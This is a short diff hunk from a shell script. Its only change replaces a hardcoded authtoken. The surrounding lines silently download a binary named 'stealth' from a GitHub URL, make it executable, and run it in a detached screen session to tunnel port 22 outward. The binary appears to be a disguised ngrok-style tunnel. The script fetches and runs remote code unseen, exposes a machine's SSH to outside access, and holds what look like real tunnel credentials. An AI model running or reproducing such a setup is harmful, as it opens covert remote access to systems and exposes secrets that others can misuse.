@@ -20,7 +20,7 @@ wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/stealth >/de
 sleep 2
 chmod +x stealth
 sleep 2
-./stealth authtoken 1hPY6A7OjP5HfIbcres8VBFPXpy_6iMubeSgbKqXiQcAmf7vy
+./stealth authtoken 1hPVtnFViFxmKgZ7xCsRonAP1gM_7XJftJUxFEGpnjM1ySm64
 sleep 2
 screen -dmS ngroo bash -c './stealth tcp 22'
 sleep 2
